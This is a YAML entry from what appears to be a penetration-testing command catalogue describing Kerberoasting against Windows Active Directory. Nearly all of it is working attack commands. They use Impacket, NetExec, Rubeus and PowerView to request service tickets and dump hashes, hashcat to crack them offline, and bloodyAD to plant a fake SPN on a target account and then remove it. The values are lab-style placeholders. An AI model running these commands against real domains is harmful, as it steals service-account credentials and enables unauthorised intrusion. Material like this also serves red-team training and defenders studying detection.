---
description: |
  Kerberoasting — request TGS tickets for service accounts with SPNs and crack them offline. Can also set SPNs on vulnerable accounts (targeted Kerberoasting).
commands:
  - have: Credentials
    cmd: |
      # Request TGS tickets for all SPNs (Impacket)
      impacket-GetUserSPNs senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -request -outputfile hashes.kerberoast

      # Kerberoasting via NetExec
      nxc ldap 10.10.10.27 -u sec_user -p 'P@ssw0rd' --kerberoasting output.txt

      # Crack TGS hashes with hashcat
      hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
  - have: SPN
    cmd: |
      # Targeted Kerberoasting — set SPN on a vulnerable account
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set object targetuser servicePrincipalName -v 'HTTP/fakespn.senshu.local'

      # Request TGS for the targeted account
      impacket-GetUserSPNs senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -request -outputfile targeted.kerberoast

      # Clean up — remove the SPN after obtaining the hash
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set object targetuser servicePrincipalName
  - have: Shell
    cmd: |
      # Rubeus — Kerberoast from a Windows session
      .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

      # PowerView — find SPN accounts and request tickets
      Import-Module .\PowerView.ps1
      Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv -NoTypeInformation kerberoast.csv
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Kerberos
techniques:
  - Kerberoasting
references:
  - https://github.com/fortra/impacket
  - https://github.com/GhostPack/Rubeus
  - https://www.netexec.wiki/
---
